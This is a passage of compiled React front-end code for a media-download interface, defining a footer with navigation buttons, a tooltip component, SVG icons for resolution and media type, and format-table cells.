                componentId: "sc-169jj9b-3",
            })`font-family:Arial,Helvetica,sans-serif;font-weight:500;font-size:14px;&::before{content:" ";display:inline-block;width:9px;}`;
        var footer = () => {
            const { dir: dir, theme: theme, sendEvent: sendEvent, downloadsCount: downloadsCount, getContactUsUrl: getContactUsUrl, setListMode: setListMode } = use_app_state([
                    "dir",
                    "theme",
                    "sendEvent",
                    "downloadsCount",
                    "getContactUsUrl",
                    "setListMode",
                ]),
                location = useLocation(),
                { t: t, i18n: i18n } = useTranslation(),
                history = useHistory(),
                pathname = location && location.pathname,
                isHome = "/" === pathname,
                isExpanded = "/more" === pathname,
                { socialMediaSharingUrl: socialMediaSharingUrl } = config.a,
                { language: language } = i18n,
                landingUrl = getContactUsUrl(language),
                showSocialMediaSharingButton = socialMediaSharingUrl && downloadsCount > 0,
                borderTop = theme && theme.footer_border_top,
                buttonStyles = theme && theme.icon_button,
                buttonColor = buttonStyles && buttonStyles.color,
                buttonHoverColor = buttonStyles && buttonStyles.hover;
            return react_default.a.createElement(
                footer_Container,
                { justifyContentEnd: isHome, borderTop: borderTop, buttonColor: buttonColor, buttonHoverColor: buttonHoverColor },
                isHome
                    ? react_default.a.createElement(
                          react_default.a.Fragment,
                          null,
                          showSocialMediaSharingButton &&
                              react_default.a.createElement(
                                  footer_Button,
                                  {
                                      onClick: (evt) => {
                                          evt.preventDefault(), evt.stopPropagation(), sendEvent({ action: "share_btn" }), history.push("/social-media-sharing");
                                      },
                                  },
                                  react_default.a.createElement(heart, null)
                              ),
                          react_default.a.createElement(
                              footer_Button,
                              {
                                  onClick: (evt) => {
                                      evt.preventDefault(), evt.stopPropagation(), sendEvent({ action: "settings" }), history.push("/settings");
                                  },
                              },
                              react_default.a.createElement(gear, null)
                          ),
                          react_default.a.createElement(
                              footer_Button,
                              {
                                  onClick: () => {
                                      sendEvent({ action: "help" }), history.push("/help");
                                  },
                              },
                              react_default.a.createElement(help, null)
                          ),
                          landingUrl &&
                              react_default.a.createElement(
                                  footer_Button,
                                  {
                                      onClick: () => {
                                          window.open(landingUrl, "_blank");
                                      },
                                  },
                                  react_default.a.createElement(feedback, null)
                              )
                      )
                    : react_default.a.createElement(
                          ButtonBack,
                          {
                              dir: dir,
                              onClick: () => {
                                  isExpanded && setListMode("short"), history.go(-1);
                              },
                          },
                          react_default.a.createElement(arrow_back, null),
                          react_default.a.createElement(TextBack, null, t("return_to_the_previous_screen"))
                      )
            );
        };
        var page = ({ children: children, title: title }) => {
                const location = useLocation(),
                    isSocialMediaSharing = "/social-media-sharing" === (location && location.pathname),
                    { status: status } = use_app_state(["status"]),
                    isDownloadError = "downloadError" === status;
                return react_default.a.createElement(
                    error_boundary,
                    null,
                    !isDownloadError && react_default.a.createElement(page_header, null, title),
                    children,
                    !isSocialMediaSharing && !isDownloadError && react_default.a.createElement(footer, null)
                );
            },
            row = styled_components_browser_esm.a.tr.withConfig({
                displayName: "row",
                componentId: "sc-19j5d2f-0",
            })`height:35px;cursor:pointer;&::before,&:first-child::after{content:" ";box-sizing:border-box;position:absolute;display:block;z-index:0;}&:hover::before{margin-top:4px;left:0;right:0;height:27px;background-color:${(props) =>
                props.hoverBackground};}&:first-child::after{left:16px;right:16px;height:35px;border-top:${(props) => props.border};border-bottom:${(props) => props.border};}`;
        const StHint = styled_components_browser_esm.a.div.withConfig({ displayName: "tooltip__StHint", componentId: "sc-kl7f36-0" })`${(props) =>
                props.theme && `\n    color: ${props.theme.color};\n    background-color: ${props.theme.background};\n    border: 1px solid ${props.theme.border};\n  `} border-radius:2px;position:absolute;top:${(props) =>
                props.posY}px;left:${(props) => props.posX}px;max-width:250px;padding:6px 8px;font-family:Arial,Helvetica,sans-serif;font-size:12px;line-height:18px;user-select:none;box-sizing:border-box;opacity:${(props) =>
                props.opacity};transition:opacity 0.2s ease-in-out;&::before{content:" ";position:absolute;top:-3px;right:-1px;bottom:-3px;left:-1px;}`,
            Hint = ({ title: title, element: element, isElementMouseOver: isElementMouseOver }) => {
                const { theme: theme, module: module, publicIds: publicIds } = use_app_state(["theme", "module", "publicIds"]),
                    { tooltip: tooltipId } = publicIds,
                    tooltip = document.getElementById(tooltipId),
                    [isTooltip, setIsTooltip] = Object(react.useState)(!1),
                    [isTooltipMouseOver, setIsTooltipMouseOver] = Object(react.useState)(!1),
                    [posX, setPosX] = Object(react.useState)(0),
                    [posY, setPosY] = Object(react.useState)(0),
                    [opacity, setOpacity] = Object(react.useState)(0);
                !isTooltip && tooltip && element && isElementMouseOver && !opacity && setIsTooltip(!0);
                const computedOpacity = isTooltip && (isElementMouseOver || isTooltipMouseOver) ? 1 : 0;
                return (
                    computedOpacity !== opacity && setOpacity(computedOpacity),
                    isTooltip
                        ? Object(react_dom.createPortal)(
                              react_default.a.createElement(
                                  StHint,
                                  {
                                      theme: theme && theme.tooltip,
                                      ref: (node) => {
                                          if (node) {
                                              const elementRect = element.getBoundingClientRect();
                                              if (elementRect) {
                                                  const nodeRect = node.getBoundingClientRect();
                                                  if (nodeRect) {
                                                      const margin = 2,
                                                          { getScrollContainer: getScrollContainer } = module,
                                                          moduleScrollContainer = getScrollContainer && getScrollContainer(),
                                                          scrollTop = moduleScrollContainer ? moduleScrollContainer.scrollTop : window.pageYOffset,
                                                          newNodeTop = elementRect.top - nodeRect.height - margin;
                                                      setPosY(newNodeTop - margin > 0 ? scrollTop + newNodeTop : scrollTop + elementRect.bottom + margin);
                                                      const elementCenter = elementRect.left + elementRect.width / 2,
                                                          nodeWidth = nodeRect.width,
                                                          { clientWidth: clientWidth } = document.body;
                                                      setPosX(elementCenter - nodeWidth / 2 < margin ? margin : elementCenter + nodeWidth / 2 > clientWidth - margin ? clientWidth - margin - nodeWidth : elementCenter - nodeWidth / 2);
                                                  }
                                              }
                                          }
                                      },
                                      posX: posX,
                                      posY: posY,
                                      opacity: opacity,
                                      onTransitionEnd: () => {
                                          isElementMouseOver || isTooltipMouseOver || setIsTooltip(!1);
                                      },
                                      onMouseEnter: () => {
                                          setIsTooltipMouseOver(!0);
                                      },
                                      onMouseLeave: () => {
                                          setIsTooltipMouseOver(!1);
                                      },
                                  },
                                  title
                              ),
                              tooltip
                          )
                        : null
                );
            };
        var ui_tooltip = ({ children: children, title: title }) => {
            const [element, setElement] = Object(react.useState)(),
                [isMouseOver, setIsMouseOver] = Object(react.useState)(!1),
                [isElementMouseOver, setIsElementMouseOver] = Object(react.useState)(!1),
                [isTimeout, setIsTimeout] = Object(react.useState)(!1),
                computedElementIsMouseOver = !isTimeout && isMouseOver;
            return (
                isElementMouseOver !== computedElementIsMouseOver && setIsElementMouseOver(computedElementIsMouseOver),
                react_default.a.createElement(
                    react_default.a.Fragment,
                    null,
                    Object(react.cloneElement)(children, {
                        onMouseEnter: () => {
                            setIsMouseOver(!0),
                                setIsTimeout(!0),
                                setTimeout(() => {
                                    setIsTimeout(!1);
                                }, 200);
                        },
                        onMouseLeave: () => {
                            setIsElementMouseOver(!1), setIsMouseOver(!1);
                        },
                        ref: (node) => {
                            node && setElement(node);
                        },
                    }),
                    react_default.a.createElement(Hint, { title: title, element: element, isElementMouseOver: isElementMouseOver })
                )
            );
        };
        var icons_copy = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "13px", height: "15px", viewBox: "0 0 13 15", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d: "M9.5,0H1.4C0.6,0,0,0.6,0,1.4v9.5h1.4V1.4h8.2V0z M11.6,2.7H4.1c-0.8,0-1.4,0.6-1.4, 1.4v9.5c0,0.8,0.6,1.4,1.4,1.4h7.5c0.8,0,1.4-0.6,1.4-1.4V4.1C13,3.3,12.3,2.7, 11.6,2.7z M11.6,13.6H4.1V4.1h7.5V13.6z",
                })
            );
        var qr_code = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "15px", height: "15px", viewBox: "0 0 15 15", style: style, className: className },
                react_default.a.createElement("path", { fill: color, d: "M0,0v6.8h6.8V0H0z M5.9,5.9H1V1h4.9L5.9,5.9L5.9,5.9z" }),
                react_default.a.createElement("rect", { fill: color, x: "2", y: "2", width: "2.9", height: "2.9" }),
                react_default.a.createElement("path", { fill: color, d: "M8.2,0v6.8H15V0H8.2z M14,5.9H9.1V1H14V5.9z" }),
                react_default.a.createElement("rect", { fill: color, x: "10.1", y: "2", width: "2.9", height: "2.9" }),
                react_default.a.createElement("path", { fill: color, d: "M0,8.2V15h6.8V8.2H0z M5.9,14H1V9.1h4.9L5.9,14L5.9,14z" }),
                react_default.a.createElement("rect", { fill: color, x: "2", y: "10.1", width: "2.9", height: "2.9" }),
                react_default.a.createElement("polygon", { fill: color, points: "8.2,8.2 8.2,15 10.1,15 10.1,14 9.1,14 9.1,12.1 10.1,12.1 10.1,11.1 9.1,11.1 9.1,9.1 10.1,9.1 10.1,8.2 " }),
                react_default.a.createElement("rect", { fill: color, x: "14", y: "8.2", width: "1", height: "1" }),
                react_default.a.createElement("polygon", { fill: color, points: "14,14 13,14 13,15 15,15 15,10.4 14,10.4 " }),
                react_default.a.createElement("rect", { fill: color, x: "11.1", y: "8.2", width: "2", height: "1" }),
                react_default.a.createElement("polygon", { fill: color, points: "13,12.1 12.1,12.1 12.1,11.1 13,11.1 13,10.1 11.1,10.1 11.1,13 13,13 " }),
                react_default.a.createElement("rect", { fill: color, x: "11.1", y: "14", width: "1", height: "1" })
            );
        var check = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "30px", height: "21.5px", viewBox: "0 0 30 21.5", style: style, className: className },
                    react_default.a.createElement("path", { fill: color, d: "M29.7,0c-0.5-0.5-1.2-0.5-1.6,0L9.3,18.7L2,11.3c-0.5-0.5-1.2-0.5-1.6, 0c-0.5,0.5-0.5,1.2,0,1.6l8.2,8.2c0.5,0.5,1.2,0.5,1.6,0L29.7,1.6C30.1, 1.2,30.1,0.5,29.7,0z" })
                ),
            human_readable_content_length = (contentLength) => {
                const i = Math.floor(Math.log(contentLength) / Math.log(1024));
                return `${parseFloat((contentLength / 1024 ** i).toFixed(1))} ${["bytes", "Kb", "Mb", "Gb", "Tb", "Pb", "Eb", "Zb", "Yb"][i]}`;
            },
            size = ({ media: media }) => {
                const contentLength = media_content_length(media);
                if (!contentLength) return null;
                const sizeStr = human_readable_content_length(contentLength);
                return react_default.a.createElement(react_default.a.Fragment, null, "~ " + sizeStr);
            };
        const Cell = styled_components_browser_esm.a.td.withConfig({ displayName: "cell__Cell", componentId: "sc-1t1zn6e-0" })`vertical-align:middle;position:relative;z-index:1;white-space:nowrap;font-size:14px;color:${(props) =>
            props.color ||
            "black"};&:first-child::before,&:last-child::after,&:nth-child(5)[colspan]:not(:last-child)::after{content:" ";display:inline-block;width:16px;}&:first-child,&:not(:nth-child(5)):last-child{width:32px;}&:nth-child(2){padding:0 10px;}&:nth-child(3):not(:last-child) div svg{fill:${(
            props
        ) => props.videoIconColor};}&:nth-child(3):last-child,&:not(:nth-child(3)){& svg{vertical-align:middle;}}&:nth-child(4){&:not([colspan]):not(:empty){width:18px;& svg{fill:${(props) =>
            props.videoIconColor};}& + td{padding:0 5px;}}&[colspan] + td{width:20px;}}&:nth-child(5)[colspan]:last-child{max-width:170px;overflow:hidden;text-overflow:ellipsis;}&:first-child svg{fill:${(props) =>
            props.mediaTypeIconColor};}& button{& svg{fill:${(props) => props.serviceIconColor};}&:hover svg{fill:${(props) => props.serviceIconHoverColor};}}`;
        var cell = ({ colSpan: colSpan, children: children }) => {
            const { theme: theme } = use_app_state(["theme"]),
                formatsTable = theme && theme.formats_table,
                color = formatsTable && formatsTable.color,
                mediaTypeIconColor = formatsTable && formatsTable.media_type_icon,
                videoIconColor = formatsTable && formatsTable.video_icon,
                serviceIconStyles = formatsTable && formatsTable.service_icon,
                serviceIconColor = serviceIconStyles && serviceIconStyles.color,
                serviceIconHoverColor = serviceIconStyles && serviceIconStyles.hover;
            return react_default.a.createElement(
                Cell,
                { colSpan: colSpan, color: color, mediaTypeIconColor: mediaTypeIconColor, videoIconColor: videoIconColor, serviceIconColor: serviceIconColor, serviceIconHoverColor: serviceIconHoverColor },
                children
            );
        };
        var fps_60 = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "21px", height: "13px", viewBox: "0 0 21 13", style: style, className: className },
                    react_default.a.createElement("path", {
                        fill: color,
                        d:
                            "M 20.75 12.75 Q 21 12.5 21 12.05 L 21 0.95 Q 21 0.5 20.75 0.25 20.5 0 20.15 0 L 0.85 0 Q 0.5 0 0.25 0.25 0 0.5 0 0.95 L 0 12.05 Q 0 12.5 0.25 12.75 0.5 13 0.85 13 L 20.15 13 Q 20.5 13 20.75 12.75 M 20.15 0.85 L 20.15 12.15 0.85 12.15 0.85 0.85 20.15 0.85 M 8.45 5.5 Q 7.2 4.95 5.3 5.75 5.7658203125 3.1357421875 9.05 4 L 9.05 2.6 Q 6.15 2.3 4.85 3.4 3.7 4.35 3.55 6.5 3.35 10.45 6.65 10.5 8 10.55 8.85 9.85 9.75 9.1 9.7 7.7 9.65 6.05 8.45 5.5 M 5.25 6.65 L 5.25 6.6 Q 6.3 6.2 7.1 6.45 7.85 6.75 7.9 7.5 7.95 9.3 6.55 9.3 5.25 9.3 5.25 6.65 M 14.4 2.5 Q 12.8 2.55 12.1 3.5 11.35 4.45 11.4 6.5 11.35 8.55 12.1 9.5 12.8 10.45 14.4 10.5 16 10.45 16.7 9.5 17.45 8.55 17.4 6.5 17.45 4.45 16.7 3.5 16 2.55 14.4 2.5 M 14.4 9.35 Q 13.15 9.4 13.15 6.45 13.15 3.65 14.4 3.65 15.15 3.65 15.45 4.4 15.65 4.95 15.65 6.45 15.65 9.3 14.4 9.35 Z",
                    })
                ),
            icons_fps = ({ video: video }) => {
                return isVideo((item = video)) && 60 === item.fps ? react_default.a.createElement(fps_60, null) : null;
                var item;
            };
        var resolution_8k = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "21px", height: "13px", viewBox: "0 0 21 13", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M 20.75 12.75 Q 21 12.5 21 12.05 L 21 0.95 Q 21 0.5 20.75 0.25 20.5 0 20.15 0 L 0.85 0 Q 0.5 0 0.25 0.25 0 0.5 0 0.95 L 0 12.05 Q 0 12.5 0.25 12.75 0.5 13 0.85 13 L 20.15 13 Q 20.5 13 20.75 12.75 M 20.15 0.85 L 20.15 12.15 0.85 12.15 0.85 0.85 20.15 0.85 M 9 4.4 Q 8.95 2.3 6 2.3 3.05 2.3 2.95 4.5 2.95 5.65 4.5 6.3 3.5 6.7 3.15 7.25 2.75 7.8 2.8 8.7 2.85 9.45 3.75 10.1 4.7 10.7 6 10.7 9.05 10.7 9.2 8.15 9.25 7.35 8.6 6.75 8.25 6.45 7.5 6.05 9 5.6 9 4.4 M 7.2 4.15 Q 7.35 4.7 6.75 5.65 5.75 5.4 5.35 5.1 4.65 4.6 4.85 4.1 5.05 3.6 6 3.55 7.05 3.5 7.2 4.15 M 7.25 8.15 Q 7.4 9.25 5.75 9.3 4.8 9.35 4.55 8.45 4.25 7.5 5.25 6.55 7.05 7.1 7.25 8.15 M 18.1 2.55 L 15.95 2.55 13 6.15 13 2.55 11.15 2.55 11.15 10.25 13 10.25 13 7.9 13.6 7.2 16.1 10.25 18.25 10.25 15 6.3 18.1 2.55 Z",
                })
            );
        var resolution_4k = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "21px", height: "13px", viewBox: "0 0 21 13", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M 20.75 12.75 Q 21 12.5 21 12.05 L 21 0.95 Q 21 0.5 20.75 0.25 20.5 0 20.15 0 L 0.85 0 Q 0.5 0 0.25 0.25 0 0.5 0 0.95 L 0 12.05 Q 0 12.5 0.25 12.75 0.5 13 0.85 13 L 20.15 13 Q 20.5 13 20.75 12.75 M 20.15 0.85 L 20.15 12.15 0.85 12.15 0.85 0.85 20.15 0.85 M 8.4 2.55 L 6.55 2.55 2.7 7.25 2.7 8.45 6.55 8.45 6.55 10.25 8.4 10.25 8.4 8.45 9.35 8.45 9.35 7.25 8.4 7.25 8.4 2.55 M 4.05 7.25 L 6.55 4.1 6.55 7.25 4.05 7.25 M 18.1 2.55 L 15.95 2.55 13 6.15 13 2.55 11.15 2.55 11.15 10.25 13 10.25 13 7.9 13.6 7.2 16.1 10.25 18.25 10.25 15 6.3 18.1 2.55 Z",
                })
            );
        var resolution_2k = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "21px", height: "13px", viewBox: "0 0 21 13", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M 20.75 12.75 Q 21 12.5 21 12.05 L 21 0.95 Q 21 0.5 20.75 0.25 20.5 0 20.15 0 L 0.85 0 Q 0.5 0 0.25 0.25 0 0.5 0 0.95 L 0 12.05 Q 0 12.5 0.25 12.75 0.5 13 0.85 13 L 20.15 13 Q 20.5 13 20.75 12.75 M 20.15 0.85 L 20.15 12.15 0.85 12.15 0.85 0.85 20.15 0.85 M 5.55 3.7 Q 6.35 3.65 6.85 4.4 7.2 4.95 7.05 5.45 6.85 6.05 5.85 7 L 3.25 9.1 3.25 10.25 9.25 10.25 9.25 8.95 5.75 8.9 Q 7.25 7.7 7.75 7.15 8.45 6.45 8.7 5.75 9.1515625 4.3982421875 8.6 3.4 8.044921875 2.4546875 6.3 2.35 4.8 2.3 3.45 2.85 L 3.45 4.45 Q 4.8 3.7 5.55 3.7 M 18.1 2.55 L 15.95 2.55 13 6.15 13 2.55 11.15 2.55 11.15 10.25 13 10.25 13 7.9 13.6 7.2 16.1 10.25 18.25 10.25 15 6.3 18.1 2.55 Z",
                })
            );
        var resolution_fhd = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "29px", height: "13px", viewBox: "0 0 29 13", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M 28.75 0.25 Q 28.5 0 28.15 0 L 0.85 0 Q 0.5 0 0.25 0.25 0 0.5 0 0.95 L 0 12.05 Q 0 12.5 0.25 12.75 0.5 13 0.85 13 L 28.15 13 Q 28.5 13 28.75 12.75 29 12.5 29 12.05 L 29 0.95 Q 29 0.5 28.75 0.25 M 28.15 0.85 L 28.15 12.15 0.85 12.15 0.85 0.85 28.15 0.85 M 7.95 4 L 7.95 2.7 2.65 2.7 2.65 10.35 4.5 10.35 4.5 6.85 7.7 6.85 7.7 5.55 4.5 5.55 4.5 4 7.95 4 M 14.95 5.55 L 11.75 5.55 11.75 2.7 9.9 2.7 9.9 10.35 11.75 10.35 11.75 6.85 14.95 6.85 14.95 10.35 16.8 10.35 16.8 2.7 14.95 2.7 14.95 5.55 M 25.25 3.6 Q 24.25 2.75 22.95 2.7 L 19.25 2.7 19.25 10.3 22.95 10.3 Q 24.25 10.25 25.25 9.4 26.35 8.4 26.4 6.5 26.35 4.6 25.25 3.6 M 21.1 4 Q 23.1 3.95 23.9 4.55 24.6 5.1 24.55 6.5 24.6 7.9 23.9 8.45 23.1 9.05 21.1 9 L 21.1 4 Z",
                })
            );
        var resolution_hd = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "21px", height: "13px", viewBox: "0 0 21 13", style: style, className: className },
                    react_default.a.createElement("path", {
                        fill: color,
                        d:
                            "M 20.75 12.75 Q 21 12.5 21 12.05 L 21 0.95 Q 21 0.5 20.75 0.25 20.5 0 20.15 0 L 0.85 0 Q 0.5 0 0.25 0.25 0 0.5 0 0.95 L 0 12.05 Q 0 12.5 0.25 12.75 0.5 13 0.85 13 L 20.15 13 Q 20.5 13 20.75 12.75 M 20.15 0.85 L 20.15 12.15 0.85 12.15 0.85 0.85 20.15 0.85 M 7.3 2.7 L 7.3 5.55 4.1 5.55 4.1 2.7 2.25 2.7 2.25 10.35 4.1 10.35 4.1 6.85 7.3 6.85 7.3 10.35 9.15 10.35 9.15 2.7 7.3 2.7 M 17.6 3.6 Q 16.6 2.75 15.3 2.7 L 11.6 2.7 11.6 10.3 15.3 10.3 Q 16.6 10.25 17.6 9.4 18.7 8.4 18.75 6.5 18.7 4.6 17.6 3.6 M 16.9 6.5 Q 16.95 7.9 16.25 8.45 15.45 9.05 13.45 9 L 13.45 4 Q 15.45 3.95 16.25 4.55 16.95 5.1 16.9 6.5 Z",
                    })
                ),
            resolution = ({ video: video }) => {
                return isVideo((item = video)) && item.height >= 4320
                    ? react_default.a.createElement(resolution_8k, null)
                    : isVideo4k(video)
                    ? react_default.a.createElement(resolution_4k, null)
                    : ((item) => isVideo(item) && item.height >= 1440 && item.height < 2160)(video)
                    ? react_default.a.createElement(resolution_2k, null)
                    : ((item) => isVideo(item) && item.height >= 1080 && item.height < 1440)(video)
                    ? react_default.a.createElement(resolution_fhd, { className: "fhd" })
                    : ((item) => isVideo(item) && item.height >= 720 && item.height < 1080)(video)
                    ? react_default.a.createElement(resolution_hd, null)
                    : null;
                var item;
            };
        var play_video = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "15px", height: "15px", viewBox: "0 0 15 15", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M0.9,0h13.1c0.2,0,0.4,0.1,0.6,0.2C14.8,0.4,15,0.7,15,0.9v13.1c0, 0.2-0.1,0.5-0.3,0.7S14.3,15,14.1,15H0.9c-0.3, 0-0.7-0.2-0.8-0.5c0-0.1-0.1-0.3-0.1-0.5V0.9c0-0.3,0.1-0.5,0.3-0.7S0.7, 0,0.9,0 M0.9,1c0,0.8,0,1.5,0,2.3c0.7,0,1.2,0,1.9,0c0-0.8,0-1.6, 0-2.3C2.3,0.9,1.6,0.9,0.9,1C0.9,0.9,0.9,1,0.9,1M3.8,0.9c0, 4.4,0,8.7,0,13.1c2.5,0,5,0,7.5,0c0-4.4,0-8.7,0-13.1C8.7,0.9,6.3,0.9, 3.8,0.9 M12.2,0.9c0,0.8,0,1.6,0,2.3c0.7,0,1.2,0,1.9,0c0-0.8,0-1.5, 0-2.3c0-0.1,0-0.1-0.1-0.1C13.4,0.9,12.8,0.9,12.2,0.9 M0.9,4.2c0,0.9, 0,1.9,0,2.8c0.7,0,1.2,0,1.9,0c0-0.9,0-1.9,0-2.8C2.2,4.2,1.6,4.2,0.9, 4.2 M12.2,4.2c0,0.9,0,1.9,0,2.8c0.7,0,1.2,0,1.9,0c0-0.9,0-1.9, 0-2.8C13.4,4.2,12.8,4.2,12.2,4.2 M0.9,8c0,0.9,0,1.9,0,2.8c0.7,0,1.2, 0,1.9,0c0-0.9,0-1.9,0-2.8C2.2,8,1.6,8,0.9,8 M12.2,8c0,0.9,0,1.9,0, 2.8c0.7,0,1.2,0,1.9,0c0-0.9,0-1.9,0-2.8C13.4,8,12.8,8,12.2,8M0.9, 11.7c0,0.8,0,1.5,0,2.3c0,0,0,0.1,0.1,0.1c0.6,0,1.2,0,1.8,0c0-0.8,0-1.6, 0-2.3C2.2,11.7,1.6,11.7,0.9,11.7 M12.2,11.7c0,0.8,0,1.6,0,2.3c0.6, 0,1.2,0,1.8,0c0.1,0,0.1-0.1,0.1-0.1c0-0.8,0-1.5,0-2.3C13.4,11.7, 12.8,11.7,12.2,11.7z",
                }),
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M6.2,4.3c0.3,0,0.6,0.1,0.8,0.2C8,5.2,8.9,5.9,9.8,6.6c0.3,0.2,0.5, 0.5,0.5,0.8c0.1,0.3,0,0.7-0.2,0.8C10,8.3,9.8,8.4,9.8,8.4c-0.8,0.7-1.7, 1.2-2.5,1.9c-0.2,0.1-0.4,0.3-0.6,0.4c-0.4,0.1-0.8, 0.1-1-0.1c-0.3-0.2-0.5-0.4-0.5-0.7c0-0.2,0-0.3,0-0.5c0-1.3,0-2.6, 0-3.9c0-0.2,0.1-0.4,0.2-0.6C5.5,4.5,5.8,4.3,6.2,4.3 M6.2,5.3c-0.1,0-0.1, 0.1-0.1,0.2c0,1.4,0,2.8,0,4.1c0,0.2,0.2,0.3,0.4,0.2c0.9-0.7,1.9-1.3, 2.7-2c0.1-0.1,0.2-0.2,0.2-0.3c0-0.1,0-0.2-0.1-0.2C8.3,6.7,7.5,6,6.6, 5.3C6.5,5.3,6.4,5.2,6.2,5.3z",
                })
            );
        var sound_on = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "15px", height: "14.8px", viewBox: "0 0 15 14.8", style: style, className: className },
                    react_default.a.createElement("path", {
                        fill: color,
                        d:
                            "M0.4,10.5h3.4L9,14.9C9.1,15,9.3,15,9.5,14.9c0.2-0.1,0.3-0.2, 0.3-0.4V0.4c0-0.2-0.1-0.3-0.3-0.4C9.3-0.1,9.1-0.1,9,0.1L3.8, 4.4H0.4C0.2,4.4,0,4.6,0,4.8v5.3C0,10.3,0.2,10.5,0.4,10.5L0.4, 10.5z M8.8,13.6L4.4,9.9V5l4.5-3.7V13.6z M0.9,5.3h2.6v4.4H0.9V5.3z",
                    }),
                    react_default.a.createElement("path", { fill: color, d: "M12.7,11.5c0.2,0.2,0.5,0.2,0.6,0c2.2-2.2,2.2-5.9, 0-8.1c-0.2-0.2-0.5-0.2-0.6,0c-0.2,0.2-0.2,0.5,0,0.6c1.9,1.9,1.9, 5,0,6.8C12.5,11,12.5,11.3,12.7,11.5z" }),
                    react_default.a.createElement("path", { fill: color, d: "M10.8,9.6c0.2,0.2,0.5,0.2,0.6,0c1.2-1.2,1.2-3.2, 0-4.4c-0.2-0.2-0.5-0.2-0.6,0c-0.2,0.2-0.2,0.5,0,0.6c0.9,0.9,0.9, 2.3,0,3.1C10.7,9.2,10.7,9.5,10.8,9.6z" })
                ),
            media_type = ({ media: media }) => (isVideo(media) ? react_default.a.createElement(play_video, null) : isAudio(media) ? react_default.a.createElement(sound_on, null) : null);
        const VideoIconsContainer = styled_components_browser_esm.a.div.withConfig({
            displayName: "row-start__VideoIconsContainer",
            componentId: "sc-68db28-0",
        })`display:inline-flex;align-items:center;margin:10px 6px;padding:0 6px;& svg{&:not(.fhd){margin:0 10px;}&.fhd{margin:0 6px;}}`;
        var row_start = ({ data: data }) =>
                react_default.a.createElement(
                    react_default.a.Fragment,
                    null,
                    react_default.a.createElement(cell, null, react_default.a.createElement(media_type, { media: data })),
                    react_default.a.createElement(cell, null, react_default.a.createElement(title_Title, { item: data })),
                    react_default.a.createElement(
                        cell,
                        null,
                        60 === data.fps || data.width > 1279
                            ? react_default.a.createElement(VideoIconsContainer, null, react_default.a.createElement(resolution, { video: data }), react_default.a.createElement(icons_fps, { video: data }))
                            : react_default.a.createElement("span", null)
                    )
                ),
            icon_logo = () => react_default.a.createElement(extension_logo, { style: { width: 12, margin: "0 3px" } });
        var external_link = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "15px", height: "15px", viewBox: "0 0 15 15", style: style, className: className },
                    react_default.a.createElement("path", {
                        fill: color,
                        d:
                            "M14.1,0H8.9C8.4,0,8,0.4,8,0.9s0.4,0.9,0.9,0.9h2.9L7,6.7C6.8,6.9,6.7,7.1,6.7, 7.4S6.8,7.9,7,8c0.2,0.2,0.4,0.3,0.7,0.3c0.2,0,0.5-0.1,0.7-0.3l4.9-4.9v2.9c0, 0.5,0.4,0.9,0.9,0.9C14.6,7,15,6.6,15,6.1V0.9C15,0.4,14.6,0,14.1,0z",
                    }),
                    react_default.a.createElement("path", { fill: color, d: "M10.6,13.4h-9v-9h6.8L10,2.8H0.8C0.4,2.8,0,3.1,0,3.6v10.6C0,14.6,0.4,15,0.8, 15h10.6c0.4,0,0.8-0.4,0.8-0.8V5l-1.6,1.6V13.4z" })
                ),
            styled_button = styled_components_browser_esm.a.button.withConfig({
                displayName: "button",
                componentId: "sc-g4pn7s-0",
            })`background-color:transparent;outline:none;border:none;padding:0;cursor:pointer;&:disabled{opacity:0.4;}& svg{vertical-align:middle;}`,
            tooltip_cell = ({ status: status }) => {
                const { t: t } = useTranslation(),
                    { desktopClientName: desktopClientName, webPortalHostname: webPortalHostname } = config.a,
                    title = "idle" === status ? t("download_using_desktop_client_tooltip", { desktopClientName: desktopClientName }) : t("download_via_web_portal_tooltip", { webPortalHostname: webPortalHostname });
                return react_default.a.createElement(
                    cell,
                    null,
                    react_default.a.createElement(ui_tooltip, { title: title }, react_default.a.createElement(styled_button, null, react_default.a.createElement(external_link, { style: { transform: "translateY(-3px)" } })))
                );
            },
            available_in_desktop_row = ({ data: data, desktopClientName: desktopClientName, status: status }) =>
                react_default.a.createElement(
                    react_default.a.Fragment,
                    null,
                    react_default.a.createElement(row_start, { data: data }),
                    react_default.a.createElement(cell, null, react_default.a.createElement(icon_logo, null)),
                    react_default.a.createElement(cell, { colSpan: 2 }, desktopClientName),
                    react_default.a.createElement(tooltip_cell, { status: status })
                );
        var cpu_activity = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "18px", height: "18px", viewBox: "0 0 18 18", style: style, className: className },
                    react_default.a.createElement("path", {
